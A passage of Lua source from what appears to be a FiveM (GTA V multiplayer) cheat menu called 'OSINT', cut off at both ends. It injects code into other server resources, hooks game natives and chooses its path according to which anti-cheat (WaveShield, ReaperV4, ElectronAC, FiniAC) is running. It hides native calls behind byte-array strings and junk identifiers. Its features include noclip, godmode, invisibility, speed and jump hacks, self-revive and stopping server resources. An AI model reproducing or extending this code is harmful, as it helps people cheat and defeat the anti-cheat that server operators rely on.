                                        return originalFn(eName, ...)
                                    end)

                                    HookNative("TriggerServerEvent", function(originalFn, eName, ...)
                                        _G.OSINT.TSEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    _G.OSINT.TEvent = function(eName, ...) return TriggerEvent(eName, ...) end
                                    _G.OSINT.TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end

                                    Citizen.SetTimeout(1000, function()
                                        _G.OSINT.TEvent("esx:onPlayerSpawn")
                                        _G.OSINT.TSEvent("esx:onPlayerSpawn")
                                    end)
                                    ]])
                                    else
                                    MachoInjectResourceRaw("wasabi_ambulance", [[
                                    if not _G.OSINT then
                                        _G.OSINT = {
                                            TEvent = function(...) end,
                                            TSEvent = function(...) end
                                        }
                                    end

                                    local TriggerServerEvent = TriggerServerEvent
                                    local TriggerEvent = TriggerEvent

                                    local function HookNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then return end
                                        _G[nativeName] = function(...)
                                            print(("^7[^5OSINT^7] [^3DEBUG^7]: Hooked Native - %s"):format(nativeName))
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    HookNative("TriggerEvent", function(originalFn, eName, ...)
                                        _G.OSINT.TEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    HookNative("TriggerServerEvent", function(originalFn, eName, ...)
                                        _G.OSINT.TSEvent = function(event, ...) return originalFn(event, ...) end
                                        return originalFn(eName, ...)
                                    end)

                                    _G.OSINT.TEvent = function(eName, ...) return TriggerEvent(eName, ...) end
                                    _G.OSINT.TSEvent = function(eName, ...) return TriggerServerEvent(eName, ...) end

                                    Citizen.SetTimeout(1000, function()
                                        _G.OSINT.TEvent("esx:onPlayerSpawn")
                                        _G.OSINT.TSEvent("esx:onPlayerSpawn")
                                    end)
                                    ]])                                    
                                    end     
                                end                               
                            end,

                                    ["mc9-medicsystem"] = function()
                                        print('1')
                                    local WaveShit = GetResourceState("WaveShield") == "started"
                                    local ReaperV4Shit = GetResourceState("ReaperV4") == "started"
                                    
                                    if WaveShit then
                                    MachoInjectResourceRaw("mc9-medicsystem", [[
                                        print("Before - Revive")
                                        RespawnPed(PlayerPedId(), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()))
                                        print("After - Revive")
                                    ]])
                                    else
                                    if ReaperV4Shit then
                                    MachoInjectThread(0, "mc9-medicsystem", "", [[
                                        print("Before - Revive")
                                        RespawnPed(PlayerPedId(), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()))
                                        print("After - Revive")
                                    ]])
                                else
                                    MachoInjectResourceRaw("mc9-medicsystem", [[
                                        print("Before - Revive")
                                        RespawnPed(PlayerPedId(), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()))
                                        print("After - Revive")
                                    ]])
                                    end
                                end
                            end,
                        }

                                for resourceName, execution in pairs(Actions) do
                                    if GetResourceState(resourceName) == "started" then
                                        execution()
                                    end
                                end
                            end
                        },

                        { type = "slider", label = "Health", desc = "This will set your health to the desired amount.", scrollType = "onEnter", value = 100, min = 0, max = 100, step = 1.0,
                            onSelect = function(value)
                                SetEntityHealth(PlayerPedId(), value + 100.0)
                            end
                        },
                        { type = "slider", label = "Armour", desc = "This will set your armour to the desired amount.", scrollType = "onEnter", value = 100, min = 0, max = 100, step = 1.0,
                            onSelect = function(value)
                                SetPedArmour(PlayerPedId(), value)
                            end
                        },
                        { type = "button", label = "Refill Health", desc = "This will refill your health to the maximum value.",
                            onSelect = function()
                                SetEntityHealth(PlayerPedId(), GetEntityMaxHealth(PlayerPedId()))
                            end
                        },
                        { type = "button", label = "Refill Armour", desc = "This will refill your armour to the maximum value.",
                            onSelect = function()
                                SetPedArmour(PlayerPedId(), 100)
                            end
                        },
                        { type = "checkbox", label = "Godmode", checked = false, desc = "This will give your player godmode.",
                            onSelect = function(checked)
                                self:HandleGodmodeToggle(checked)
                            end
                        },
                        {
                            type = "checkbox", 
                            label = "Invisibility", 
                            checked = false, 
                            desc = "This will make your player invisible.",
                            onSelect = function(checked)
                                if checked then
                                    self:EnableInvisibility()
                                else
                                    self:DisableInvisibility()
                                end
                            end
                        },
                        { type = "divider", label = "Movement" },
                        {
                            type = "slider-checkbox",
                            label = "Noclip",
                            scrollType = "onScroll",
                            checked = false,
                            value = 0.25,
                            step = 0.25,
                            min = 0.25,
                            max = 5.0,
                            onSelect = function(sliderValue, checked)
                                if checked then
                                    if not FirstInjectionPassed then
                                        OSINT:Notify("info", "OSINT", "Initializing... Please wait!", 1000)
                                        Wait(400)
                                        FirstInjectionPassed = true
                                    end

                        if GetResourceState("WaveShield") == "started" then
                            MachoInjectResourceRaw(
                                GetResourceState("monitor") == "started" and "monitor"
                                or GetResourceState("ox_lib") == "started" and "ox_lib"
                                or "any",
                                [[
                                _G.OSINTNoclipSpeed = ]] .. sliderValue .. [[
                                if not _G.OSINTNoclipThreadRunning then
                                    _G.OSINTNoclipEnabled = true
                                    _G.OSINTNoclipThreadRunning = true

                                    function hNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then return end
                                        _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                    end

                                    hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetGameplayCamRelativeHeading", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetGameplayCamRelativePitch", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsPedClimbing", function(originalFn, ...) return true end)
                                    hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetGameTimer", function(originalFn, ...) return 100 end)
                                    hNative("IsPedJumpingOutOfVehicle", function(originalFn, ...) return true end)
                                    hNative("IsPedClimbing", function(originalFn, ...) return true end)
                                    hNative("GetPedParachuteState", function(originalFn, ...) return 1 end)

                                    local function initFlow(cb)
                                        local co = coroutine.create(cb)
                                        -- iterative, non-recursive executor to avoid stack growth
                                        local ok, err
                                        while coroutine.status(co) ~= "dead" do
                                            ok, err = coroutine.resume(co)
                                            if not ok then
                                                print("Coroutine error:", err)
                                                break
                                            end
                                            Citizen.Wait(0)
                                        end
                                    end

                                    initFlow(function()
                                        while _G.OSINTNoclipThreadRunning do
                                            Wait(0)
                                            if not _G.OSINTNoclipEnabled then
                                                Wait(500)
                                                goto continue
                                            end

                                            local ped = GetPlayerPed(-1)
                                            if not DoesEntityExist(ped) then goto continue end

                                            local vehicle = GetVehiclePedIsIn(ped, false)
                                            local entity = (vehicle ~= 0 and vehicle) or ped
                                            if not DoesEntityExist(entity) then goto continue end

                                            local coords = GetEntityCoords(entity, true)
                                            local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(entity)
                                            local pitch = GetGameplayCamRelativePitch()

                                            -- convert once and reuse
                                            local radH = heading * math.pi / 180.0
                                            local radP = pitch * math.pi / 180.0

                                            local dx = -math.sin(radH)
                                            local dy = math.cos(radH)
                                            local dz = math.sin(radP)
                                            local len = math.sqrt(dx*dx + dy*dy + dz*dz)
                                            if len ~= 0 then
                                                dx = dx / len
                                                dy = dy / len
                                                dz = dz / len
                                            end

                                            local speed = _G.OSINTNoclipSpeed or 0.25
                                            -- cache control checks to avoid repeating native calls
                                            local sprint = IsControlPressed(0, 21)
                                            local slow = IsControlPressed(0, 19)
                                            if sprint then speed = speed + 1 end
                                            if slow then speed = 0.10 end

                                            local forward = IsControlPressed(0, 32)
                                            local back = IsControlPressed(0, 269)
                                            local left = IsControlPressed(0, 34)
                                            local right = IsControlPressed(0, 9)
                                            local up = IsControlPressed(0, 22)
                                            local down = IsControlPressed(0, 62)

                                            if forward then
                                                coords = coords + vector3(speed * dx, speed * dy, speed * dz)
                                            elseif back then
                                                coords = coords - vector3(speed * dx, speed * dy, speed * dz)
                                            end

                                            if left then
                                                coords = coords + vector3(-speed * dy, speed * dx, 0.0)
                                            elseif right then
                                                coords = coords + vector3(speed * dy, -speed * dx, 0.0)
                                            end

                                            if up then
                                                coords = coords + vector3(0.0, 0.0, speed)
                                            elseif down then
                                                coords = coords - vector3(0.0, 0.0, speed)
                                            end

                                            SetEntityCoordsNoOffset(entity, coords.x, coords.y, coords.z, true, true, true)
                                            SetEntityHeading(entity, heading)
                                            ::continue::
                                        end
                                    end)
                                else
                                    _G.OSINTNoclipEnabled = true
                                    _G.OSINTNoclipSpeed = ]] .. sliderValue .. [[
                                end
                            ]])
                                elseif GetResourceState('ElectronAC') == 'started' or GetResourceState('FiniAC') == 'started' then
                                        MachoInjectResource2(3, GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                                            local function RotationToDirection(rot)
                                                local z = math.rad(rot.z)
                                                local x = math.rad(rot.x)
                                                local num = math.abs(math.cos(x))
                                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                            end

                                            local function GetRightVector(rot)
                                                local z = math.rad(rot.z)
                                                return vector3(math.cos(z), math.sin(z), 0.0)
                                            end

                                            local function Clamp(val, min, max)
                                                if val < min then return min end
                                                if val > max then return max end
                                                return val
                                            end

                                            local function GetGroundZForCoords(x, y, z)
                                                local found, groundZ = GetGroundZFor_3dCoord(x, y, z, false)
                                                if found then return groundZ end
                                                return z
                                            end

                                            if not _G.inNoClip then
                                                _G.inNoClip = true
                                                _G.noclipping = true
                                                _G.OSINTNoclipSpeed = ]] .. sliderValue .. [[
                                                _G.noclipCamera = nil
                                                _G.cameraReady = false
                                                _G.originalCoords = nil

                                                local function StartNoclip()
                                                    local playerPed = PlayerPedId()
                                                    _G.originalCoords = GetEntityCoords(playerPed)
                                                    _G.noclipCamera = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
                                                    SetCamCoord(_G.noclipCamera, _G.originalCoords.x, _G.originalCoords.y, _G.originalCoords.z + 1.0)
                                                    SetCamRot(_G.noclipCamera, 0.0, 0.0, GetEntityHeading(playerPed), 2)
                                                    RenderScriptCams(true, false, 0, true, true)
                                                    SetEntityVisible(playerPed, false, false)
                                                    SetEntityInvincible(playerPed, true)
                                                    SetEntityCollision(playerPed, false, false)
                                                    TaskStandStill(playerPed, -1)
                                                    CreateThread(function()
                                                        Wait(550)
                                                        _G.cameraReady = true
                                                    end)
                                                end

                                                local function Movement()
                                                    if not _G.noclipCamera or not _G.cameraReady then return end
                                                    local camCoords = GetCamCoord(_G.noclipCamera)
                                                    local camRot = GetCamRot(_G.noclipCamera, 2)
                                                    local speed = _G.OSINTNoclipSpeed or ]] .. sliderValue .. [[
                                                    if IsControlPressed(0, 21) then speed = speed + 1 end
                                                    if IsControlPressed(0, 19) then speed = 0.10 end
                                                    local forward = RotationToDirection(camRot)
                                                    local right = GetRightVector(camRot)
                                                    local moveX, moveY, moveZ = 0, 0, 0
                                                    if IsControlPressed(0, 32) then
                                                        moveX = moveX + forward.x * speed
                                                        moveY = moveY + forward.y * speed
                                                        moveZ = moveZ + forward.z * speed
                                                    end
                                                    if IsControlPressed(0, 269) then
                                                        moveX = moveX - forward.x * speed
                                                        moveY = moveY - forward.y * speed
                                                        moveZ = moveZ - forward.z * speed
                                                    end
                                                    if IsControlPressed(0, 34) then
                                                        moveX = moveX - right.x * speed
                                                        moveY = moveY - right.y * speed
                                                    end
                                                    if IsControlPressed(0, 9) then
                                                        moveX = moveX + right.x * speed
                                                        moveY = moveY + right.y * speed
                                                    end
                                                    if IsControlPressed(0, 22) then
                                                        moveZ = moveZ + speed
                                                    end
                                                    if IsControlPressed(0, 62) then
                                                        moveZ = moveZ - speed
                                                    end
                                                    SetCamCoord(_G.noclipCamera, camCoords.x + moveX, camCoords.y + moveY, camCoords.z + moveZ)
                                                    local x = GetDisabledControlNormal(0, 1)
                                                    local y = GetDisabledControlNormal(0, 2)
                                                    local newPitch = Clamp(camRot.x - y * 5, -89.0, 89.0)
                                                    local newYaw = camRot.z - x * 5
                                                    SetCamRot(_G.noclipCamera, newPitch, camRot.y, newYaw, 2)
                                                    SetFocusPosAndVel(camCoords.x, camCoords.y, camCoords.z, 0.0, 0.0, 0.0)
                                                end

                                                CreateThread(function()
                                                    StartNoclip()
                                                    while _G.inNoClip do
                                                        Wait(0)
                                                        if _G.noclipping then
                                                            Movement()
                                                        else
                                                            Wait(500)
                                                        end
                                                    end
                                                end)
                                            else
                                                _G.noclipping = true
                                                _G.OSINTNoclipSpeed = ]] .. sliderValue .. [[
                                            end
                                        ]])
                                    else
                                        MachoInjectResource2(3, GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                                            _G.OSINTNoclipSpeed = ]] .. sliderValue .. [[
                                            if not _G.OSINTNoclipThreadRunning then
                                                _G.OSINTNoclipEnabled = true
                                                _G.OSINTNoclipThreadRunning = true
                                                function hNative(nativeName, newFunction)
                                                    local originalNative = _G[nativeName]
                                                    if not originalNative or type(originalNative) ~= "function" then return end
                                                    _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                                end
                                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                                hNative("IsPedFalling", function(originalFn, ...) return true end)
                                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                                hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetGameplayCamRelativeHeading", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetGameplayCamRelativePitch", function(originalFn, ...) return originalFn(...) end)
                                                hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                                hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetGameTimer", function(originalFn, ...) return 100 end)
                                                hNative("IsPedJumpingOutOfVehicle", function(originalFn, ...) return true end)
                                                hNative("IsPedClimbing", function(originalFn, ...) return true end)
                                                hNative("GetPedParachuteState", function(originalFn, ...) return 1 end)
                                                CreateThread(function()
                                                    while _G.OSINTNoclipThreadRunning do
                                                        Wait(0)
                                                        if not _G.OSINTNoclipEnabled then
                                                            Wait(500)
                                                            goto continue
                                                        end
                                                        local ped = PlayerPedId()
                                                        if not DoesEntityExist(ped) then goto continue end
                                                        local vehicle = GetVehiclePedIsIn(ped, false)
                                                        local entity = (vehicle ~= 0 and vehicle) or ped
                                                        if not DoesEntityExist(entity) then goto continue end
                                                        local coords = GetEntityCoords(entity, true)
                                                        local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(entity)
                                                        local pitch = GetGameplayCamRelativePitch()
                                                        local dx = -math.sin(heading * math.pi / 180.0)
                                                        local dy = math.cos(heading * math.pi / 180.0)
                                                        local dz = math.sin(pitch * math.pi / 180.0)
                                                        local len = math.sqrt(dx * dx + dy * dy + dz * dz)
                                                        if len ~= 0 then
                                                            dx, dy, dz = dx / len, dy / len, dz / len
                                                        end
                                                        local speed = _G.OSINTNoclipSpeed or 0.25
                                                        if IsControlPressed(0, 21) then speed = speed + 1 end
                                                        if IsControlPressed(0, 19) then speed = 0.10 end
                                                        if IsControlPressed(0, 32) then
                                                            coords = coords + vector3(speed * dx, speed * dy, speed * dz)
                                                        end
                                                        if IsControlPressed(0, 269) then
                                                            coords = coords - vector3(speed * dx, speed * dy, speed * dz)
                                                        end
                                                        if IsControlPressed(0, 34) then
                                                            coords = coords + vector3(-speed * dy, speed * dx, 0.0)
                                                        end
                                                        if IsControlPressed(0, 9) then
                                                            coords = coords + vector3(speed * dy, -speed * dx, 0.0)
                                                        end
                                                        if IsControlPressed(0, 22) then
                                                            coords = coords + vector3(0.0, 0.0, speed)
                                                        end
                                                        if IsControlPressed(0, 62) then
                                                            coords = coords - vector3(0.0, 0.0, speed)
                                                        end
                                                        SetEntityCoordsNoOffset(entity, coords.x, coords.y, coords.z, true, true, true)
                                                        SetEntityHeading(entity, heading)
                                                        ::continue::
                                                    end
                                                end)
                                            else
                                                _G.OSINTNoclipEnabled = true
                                                _G.OSINTNoclipSpeed = ]] .. sliderValue .. [[
                                            end
                                        ]])
                                    end
                                else
                                if GetResourceState("WaveShield") == 'started' then
                                MachoInjectResourceRaw(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                                    _G.OSINTNoclipEnabled = false
                                    _G.OSINTNoclipThreadRunning = false
                                ]])
                            elseif GetResourceState('ElectronAC') == 'started' or GetResourceState('FiniAC') == 'started' then
                                        MachoInjectResource2(3, GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                                            if _G.inNoClip then
                                                _G.inNoClip = false
                                                _G.noclipping = false
                                                _G.cameraReady = false
                                                local playerPed = PlayerPedId()
                                                if _G.noclipCamera then
                                                    local camCoords = GetCamCoord(_G.noclipCamera)
                                                    local valid, groundZ = GetGroundZFor_3dCoord(camCoords.x, camCoords.y, camCoords.z, false)
                                                    local targetCoords
                                                    if valid and camCoords.z > -1000.0 and camCoords.z < 10000.0 then
                                                        targetCoords = vector3(camCoords.x, camCoords.y, groundZ + 1.0)
                                                    else
                                                        targetCoords = GetEntityCoords(playerPed)
                                                    end
                                                    SetEntityCoordsNoOffset(playerPed, targetCoords.x, targetCoords.y, targetCoords.z, true, true, true)
                                                    RenderScriptCams(false, false, 0, true, true)
                                                    DestroyCam(_G.noclipCamera, false)
                                                    _G.noclipCamera = nil
                                                else
                                                    local pedCoords = GetEntityCoords(playerPed)
                                                    SetEntityCoordsNoOffset(playerPed, pedCoords.x, pedCoords.y, pedCoords.z, true, true, true)
                                                end
                                                SetEntityVisible(playerPed, true, true)
                                                SetEntityInvincible(playerPed, false)
                                                SetEntityCollision(playerPed, true, true)
                                                ClearPedTasksImmediately(playerPed)
                                                SetFocusEntity(playerPed)
                                            end
                                        ]])
                                    else
                                        MachoInjectResourceRaw(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                                            _G.OSINTNoclipEnabled = false
                                            _G.OSINTNoclipThreadRunning = false
                                        ]])
                                    end
                                end
                            end
                        },
                        { type = "slider-checkbox", label = "Freecam", scrollType = "onScroll", checked = false, value = 0.25, step = 0.25, min = 0.25, max = 5.0,
                            onSelect = function(sliderValue, checked)
                                self:ToggleFreecam(checked, sliderValue)
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Fast Run",
                            checked = false,
                            onSelect = function(checked)
                                if checked then
                                    OSINT:Notify("success", "OSINT", "Fast Run On", 3000)

                                    if GetResourceState("WaveShield") == "started" then
                                        Injection(GetResourceState("WaveShield") == "started" and "WaveShield" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            if not _G.fastRunEnabled then
                                                _G.fastRunEnabled = true

                                                local GetPlayerPed_fn = g({71,101,116,80,108,97,121,101,114,80,101,100})
                                                local SetRun_fn = g({83,101,116,82,117,110,83,112,114,105,110,116,77,117,108,116,105,112,108,105,101,114,70,111,114,80,108,97,121,101,114})
                                                local SetPedMove_fn = g({83,101,116,80,101,100,77,111,118,101,82,97,116,101,79,118,101,114,114,105,100,101})
                                                local Wait_fn = g({87,97,105,116})

                                                local function initFlow(cb)
                                                    local co = coroutine.create(cb)
                                                    local function execCycle()
                                                        while coroutine.status(co) ~= "dead" do
                                                            local ok, err = coroutine.resume(co)
                                                            if not ok then
                                                                print("^1[FastRun] Coroutine error:^7", err)
                                                                break
                                                            end
                                                            Wait_fn(1)
                                                        end
                                                    end
                                                    execCycle()
                                                end

                                                initFlow(function()
                                                    while _G.fastRunEnabled do
                                                        local ped = GetPlayerPed_fn(-1)
                                                        if ped and ped ~= 0 then
                                                            SetRun_fn(ped, 1.49)
                                                            SetPedMove_fn(ped, 1.49)
                                                        end
                                                        Wait_fn(1)
                                                    end
                                                end)
                                            end
                                        ]])
                                    else
                                        MachoInjectResourceRaw(
                                            GetResourceState("monitor") == "started" and "monitor"
                                            or GetResourceState("ox_lib") == "started" and "ox_lib"
                                            or "any",
                                            [[
                                            if _G.FastRunActive == nil then _G.FastRunActive = false end
                                            if _G.FastRunThread == nil then
                                                _G.FastRunThread = true

                                                local CreateThread_fn = CreateThread
                                                local PlayerPedId_fn = PlayerPedId
                                                local SetRun_fn = SetRunSprintMultiplierForPlayer
                                                local SetMove_fn = SetPedMoveRateOverride

                                                CreateThread_fn(function()
                                                    while true do
                                                        Wait(0)
                                                        if not _G.FastRunActive then
                                                            Wait(500)
                                                            goto continue
                                                        end

                                                        local ped = PlayerPedId_fn()
                                                        if ped and ped ~= 0 then
                                                            SetRun_fn(PlayerId(), 1.49)
                                                            SetMove_fn(ped, 1.49)
                                                        end
                                                        ::continue::
                                                    end
                                                end)
                                            end

                                            _G.FastRunActive = true
                                        ]]
                                        )
                                    end
                                else
                                    OSINT:Notify("error", "OSINT", "Fast Run Off", 3000)

                                    if GetResourceState("WaveShield") == "started" then
                                        Injection(GetResourceState("monitor") == "started" and "monitor"
                                            or GetResourceState("ox_lib") == "started" and "ox_lib"
                                            or "any", [[
                                            _G.fastRunEnabled = false
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end
                                            local function g(n)
                                                return _G[decode(n)]
                                            end
                                            g({83,101,116,82,117,110,83,112,114,105,110,116,77,117,108,116,105,112,108,105,101,114,70,111,114,80,108,97,121,101,114})(g({80,108,97,121,101,114,73,100})(), 1.0)
                                            g({83,101,116,80,101,100,77,111,118,101,82,97,116,101,79,118,101,114,114,105,100,101})(g({80,108,97,121,101,114,80,101,100,73,100})(), 1.0)
                                        ]])
                                    else
                                        MachoInjectResourceRaw("any", [[
                                            _G.FastRunActive = false
                                            SetRunSprintMultiplierForPlayer(PlayerId(), 1.0)
                                            SetPedMoveRateOverride(PlayerPedId(), 1.0)
                                        ]])
                                    end
                                end
                            end
                        },
                        { type = "checkbox", label = "Super Jump", checked = false,
                            onSelect = function(checked)
                                local WaveDih = GetResourceState("WaveShield") == "started"

                                local function decode(tbl)
                                    local s = ""
                                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                    return s
                                end

                                local function g(n)
                                    return _G[decode(n)]
                                end

                                local function enableSuperJump()
                                    if not _G.superJumpEnabled then
                                        _G.superJumpEnabled = true
                                        g({67,114,101,97,116,101,84,104,114,101,97,100})(function()
                                            while _G.superJumpEnabled do
                                                g({83,101,116,83,117,112,101,114,74,117,109,112,84,104,105,115,70,114,97,109,101})(g({80,108,97,121,101,114,73,100})())
                                                Wait(0)
                                            end
                                        end)
                                    end
                                end

                                local function disableSuperJump()
                                    _G.superJumpEnabled = false
                                    g({83,101,116,83,117,112,101,114,74,117,109,112,84,104,105,115,70,114,97,109,101})(g({80,108,97,121,101,114,73,100})(), 1.0)
                                end

                                if checked then
                                    if WaveDih then
                                        enableSuperJump()
                                    else
                                        MachoInjectResourceRaw("any", [[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            if not _G.superJumpEnabled then
                                                _G.superJumpEnabled = true
                                                g({67,114,101,97,116,101,84,104,114,101,97,100})(function()
                                                    while _G.superJumpEnabled do
                                                        g({83,101,116,83,117,112,101,114,74,117,109,112,84,104,105,115,70,114,97,109,101})(g({80,108,97,121,101,114,73,100})())
                                                        Wait(0)
                                                    end
                                                end)
                                            end
                                        ]])
                                    end
                                else
                                    if WaveDih then
                                        print("off")
                                        disableSuperJump()
                                    else
                                        MachoInjectResourceRaw("any", [[
                                            _G.superJumpEnabled = false
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            g({83,101,116,83,117,112,101,114,74,117,109,112,84,104,105,115,70,114,97,109,101})(g({80,108,97,121,101,114,73,100})(), 1.0)
                                        ]])
                                    end
                                end
                            end
                        },


                    }
                },
                {
                    label = "Miscellaneous",
                    tabs = {
                        { icon = "", type = "button", label = "Crash Game", desc = "Crashes your game",
                            onSelect = function()
                        MachoInjectResourceRaw("any", [[
                        function SimpleJsonEncode(value)
                            if type(value) == "table" then
                                local parts = {}
                                local isArray = true
                                local maxIndex = 0

                                for k, _ in pairs(value) do
                                    if type(k) ~= "number" or k < 1 or math.floor(k) ~= k then
                                        isArray = false
                                        break
                                    end
                                    maxIndex = math.max(maxIndex, k)
                                end
                                
                                if isArray then
                                    for i = 1, maxIndex do
                                        local v = value[i]
                                        if v == nil then
                                            parts[i] = "null"
                                        else
                                            parts[i] = SimpleJsonEncode(v)
                                        end
                                    end
                                    return "[" .. table.concat(parts, ",") .. "]"
                                else
                                    for k, v in pairs(value) do
                                        if type(k) == "string" then
                                            local encodedValue = SimpleJsonEncode(v)
                                            parts[#parts + 1] = "\"" .. k .. "\":" .. encodedValue
                                        end
                                    end
                                    return "{" .. table.concat(parts, ",") .. "}"
                                end
                            elseif type(value) == "string" then
                                return "\"" .. tostring(value):gsub("\"", "\\\"") .. "\""
                            elseif type(value) == "number" or type(value) == "boolean" then
                                return tostring(value)
                            elseif value == nil then
                                return "null"
                            else
                                return "\"[unserializable:" .. type(value) .. "]\""
                            end
                        end

                        function HookNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then
                                return
                            end

                            _G[nativeName] = function(...)
                                local info = debug.getinfo(2, "Sln")
                                return newFunction(originalNative, ...)
                            end
                        end

                            local args = {...}
                            local encodedArgs = {}

                            for i, arg in ipairs(args) do
                                encodedArgs[i] = SimpleJsonEncode(arg)
                            end

                            return originalFn(eventName, ...)
                        end)

                            local args = {...}
                            local encodedArgs = {}

                            for i, arg in ipairs(args) do
                                encodedArgs[i] = SimpleJsonEncode(arg)
                            end

                            return originalFn(eventName, ...)
                        end)
                        ]])
                            end
                        },
                        { icon = "", type = "button", label = "Clear Screen Effects", desc = "Removes all screen effects",
                            onSelect = function()
                                print("Revive")
                            end
                        },
                        { icon = "", type = "button", label = "Suicide", desc = "This will kill you.",
                            onSelect = function()
                            local function RGybF0JqEt()
                                local aSdFgHjKlQwErTy = SetEntityHealth
                                aSdFgHjKlQwErTy(PlayerPedId(), 0)
                            end
                            RGybF0JqEt()
                        end
                        },
                        { icon = "", type = "button", label = "Force Ragdoll", desc = "This will ragdoll.",
                            onSelect = function()
                            MachoInjectResourceRaw("any", [[
                            local function awfAEDSADWEf()
                                local cWAmdjakwDksFD = SetPedToRagdoll
                                cWAmdjakwDksFD(PlayerPedId(), 3000, 3000, 0, false, false, false)
                            end

                            awfAEDSADWEf()
                            ]])
                            end
                        },
                        { icon = "", type = "button", label = "Remove Crutch", desc = "Remove Crutch is the server is using the correct resource",
                            onSelect = function()
                            MachoResourceStop("wasabi_crutch")
                            end
                        },
                        { icon = "", type = "scrollable", value = 1, values = { "Primary", "Secondary" }, label = "Clear Tasks", desc = "Clears the character's tasks",
                            onSelect = function(value)
                                if value == "Primary" then
                                    ClearPedTasksImmediately(PlayerPedId())
                                else
                                    if value == "Secondary" then
                                    ClearPedSecondaryTask(PlayerPedId())
                                end
                            end
                        end
                        },
                        { type = "divider", label = "Toggles" },
                        {
                            type = "checkbox",
                            label = "No Ragdoll",
                            checked = false,
                            desc = "This will prevent you from being ragdolled from admins or cheaters.",
                            onSelect = function(checked)
                                local waveStarted = GetResourceState("WaveShield") == 'started'
                                local targetRes = (GetResourceState("monitor") == "started" and "monitor")
                                    or (GetResourceState("ox_lib") == "started" and "ox_lib")
                                    or "any"

                                if checked then
                                    if waveStarted then
                                        OSINT:Notify("success", "OSINT", "No Ragdoll Enabled", 3000)
                                        Injection(GetResourceState("lb-phone") == "started" and "lb-phone" or "WaveShield", [[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if noRagdollEnabled == nil then noRagdollEnabled = false end
                                            noRagdollEnabled = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local getPed = PlayerPedId
                                                local setCanRagdoll = SetPedCanRagdoll
                                                local setRagdollOnCollision = SetPedRagdollOnCollision
                                                local setRagdollFromImpact = SetPedCanRagdollFromPlayerImpact
                                                local isRagdoll = IsPedRagdoll
                                                local clearTasks = ClearPedTasksImmediately

                                                while noRagdollEnabled and not Unloaded do
                                                    Wait(0)
                                                    local ped = getPed()
                                                    if ped and ped ~= 0 then
                                                        setCanRagdoll(ped, false)
                                                        setRagdollOnCollision(ped, false)
                                                        setRagdollFromImpact(ped, false)
                                                        if isRagdoll(ped) then
